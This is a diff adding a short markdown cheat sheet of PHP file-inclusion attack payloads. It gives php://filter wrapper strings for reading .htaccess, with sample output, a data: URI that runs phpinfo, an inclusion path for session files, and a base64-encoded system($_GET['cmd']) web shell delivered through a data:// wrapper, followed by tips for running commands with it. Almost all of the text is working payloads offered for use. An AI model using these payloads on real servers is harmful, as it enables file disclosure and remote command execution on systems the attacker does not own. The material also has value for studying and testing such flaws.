@@ -1,0 +1,36 @@
+##### File Inclusion
+
+PHP wrapers:
+
+ 
+| Payload                                                                                                  | Output                                                                                                  |
+| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
+| php://filter/string.rot13/resource=.htaccess | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf |
+| php://filter/string.toupper/resource=.htaccess | REWRITEENGINE ON OPTIONS -INDEXES |
+| php://filter/string.tolower/resource=.htaccess | rewriteengine on options -indexes |
+| php://filter/string.strip_tags/resource=.htaccess | RewriteEngine on Options -Indexes |
+
+
+data:text/plain,<?php phpinfo(); ?>
+
+
+
+PHP Session Files
+<?php echo phpinfo(); ?>
+page=/var/lib/php/sessions/sess_[sessionID]
+
+
+
+Log Poisoning
+
+
+We will use the PHP code <?php system($_GET['cmd']); echo 'Shell done!'; ?> as our payload. The value of the payload, when encoded to base64, will be
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
+
+In the table above, PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ is the base64-encoded version of the PHP code. When the server processes this request, it first decodes the base64 string and then executes the PHP code, allowing the attacker to run commands on the server via the "cmd" GET parameter.
+
+
+
+Note: It is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.
+
+
